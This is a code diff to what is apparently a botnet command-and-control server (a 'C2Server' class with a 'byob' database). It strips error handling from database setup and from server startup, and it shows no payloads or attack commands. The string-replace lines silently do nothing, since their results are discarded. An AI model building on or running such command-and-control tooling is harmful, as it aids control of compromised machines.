@@ -900,26 +900,21 @@ class C2Server(threading.Thread):
                 self.error("{} error: {}".format(self._reconnect.func_name, str(e)))
 
         def _init_setup(self, batch_file='resources/setup.sql'):
-            try:
-                overwrite   = False
-                with open(batch_file, 'r') as fd:
-                    sql = fd.read()
-                if self.user != 'root':
-                    overwrite = True
-                    sql.replace('`root`', '`%s`' % self.user)
-                if self.server_host != 'localhost':
-                    overwrite = True
-                    sql.replace('`localhost`', '`%s`' % self.server_host)
-                if overwrite:
-                    with file(batch_file, 'w') as fp:
-                        fp.write(sql)                    
-                self.execute_file(batch_file)
-                self.cmd_init_db('byob')
-                return True
-            except Exception as e:
-                self.error(e)
-            return False
-        
+            overwrite   = False
+            with open(batch_file, 'r') as fd:
+                sql = fd.read()
+            if self.user != 'root':
+                overwrite = True
+                sql.replace('`root`', '`%s`' % self.user)
+            if self.server_host != 'localhost':
+                overwrite = True
+                sql.replace('`localhost`', '`%s`' % self.server_host)
+            if overwrite:
+                with file(batch_file, 'w') as fp:
+                    fp.write(sql)                    
+            self.execute_file(batch_file)
+            self.cmd_init_db('byob')
+            return True        
 
         def debug(self, output):
             """
@@ -1383,15 +1378,15 @@ def main():
     parser.add_argument('--port', type=int, default=1337, action='store', help='port number')
     parser.add_argument('--config', action='store', default='../config.ini', help='configuration file')
     parser.add_argument('--debug', action='store_true', default=False, help='enable debugging mode')
-    try:
-        options = parser.parse_args()
-        globals()['_debug'] = options.debug
-        globals()['_threads']['server']  = C2Server(options.port, config=options.config)
-        globals()['_threads']['server'].start()
-    except Exception as e:
-        print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
-        parser.print_help()
-        sys.exit(0)
+#    try:
+    options = parser.parse_args()
+    globals()['_debug'] = options.debug
+    globals()['_threads']['server']  = C2Server(options.port, config=options.config)
+    globals()['_threads']['server'].start()
+#    except Exception as e:
+#        print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
+#        parser.print_help()
+#        sys.exit(0)
 
 if __name__ == '__main__':
     main()
